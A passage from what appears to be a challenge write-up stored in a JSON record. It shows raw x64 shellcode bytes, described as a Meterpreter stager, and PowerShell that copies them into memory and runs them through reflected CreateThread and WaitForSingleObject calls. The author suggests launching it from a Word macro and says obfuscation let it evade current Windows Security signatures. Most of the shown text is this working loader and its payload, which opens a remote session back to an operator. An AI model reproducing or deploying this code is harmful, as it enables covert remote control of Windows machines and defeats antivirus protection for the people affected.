x51,0x53,0x4d,0x68,0x48,0x66,0x76,0x66,0x62,0x53,0x57,0x70,0x45,0x73,0x54,0x5a,0x42,0x67,0x54,0x6d,0x58,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5  # Copy shellcode to the created memory region  [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)  # https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread - Microsoft Docs # https://www.pinvoke.net/default.aspx/kernel32.createthread - PInvoke  $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero,0,[IntPtr]::Zero)  # During testing, after setting preparing $hThread variable, the Meterpreter session was spawned automatically if code executed directly in Windows PowerShell ISE. The code below might be needed if this PowerShell code was called let's say from macro of Microsoft Word process.  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)    Through code obfuscation, I was able to evade the latest Windows Security signatures and achieve in-memory execution of Meterpreter shellcode as shown below:    Thanks for reading — on to the next challenge."
  }
  
]

